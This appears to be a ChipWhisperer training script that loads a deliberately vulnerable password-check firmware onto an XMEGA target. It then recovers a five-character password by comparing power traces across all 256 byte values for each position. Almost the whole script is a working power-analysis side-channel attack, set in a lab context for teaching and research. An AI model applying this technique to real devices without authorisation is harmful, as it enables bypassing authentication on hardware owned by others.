SCOPETYPE = 'OPENADC'
PLATFORM = 'CWLITEXMEGA'
SS_VER = 'SS_VER_1_1'

exec(open("basic_setup.py").read())

cw.program_target(scope, prog, "../hardware/victims/firmware/basic-passwdcheck/basic-passwdcheck-CWLITEXMEGA.hex".format(PLATFORM))

def cap_pass_trace(pass_guess):
    reset_target(scope)
    num_char = target.in_waiting()
    while num_char > 0:
        target.read(num_char, 10)
        time.sleep(0.01)
        num_char = target.in_waiting()

    scope.arm()
    target.write(pass_guess)
    ret = scope.capture()
    if ret:
        print('Timeout happened during acquisition')

    trace = scope.get_last_trace()
    return trace

scope.adc.samples = 3000

trace_test = cap_pass_trace("h\n")

#Basic sanity check
assert(len(trace_test) == 3000)
print("✔️ OK to continue!")


from string import ascii_lowercase
import numpy as np

passwd = ""
for i in range(5):
    corect = ''
    maxim = 0
    ref_trace = cap_pass_trace(passwd + "\x00\n")[0:500]
    for c in range(256):
        trace = cap_pass_trace(passwd + chr(c) + "\n")[0:500]
        sqm = np.sum(np.abs(trace - ref_trace))
        
        if sqm > maxim:
            #print(str(chr(c)) + " " + str(sqm))
            maxim = sqm
            corect = chr(c)
    passwd += str(corect)
    print("letter " + str(i) + " is " + str(corect))
    print("========================================")
print(passwd)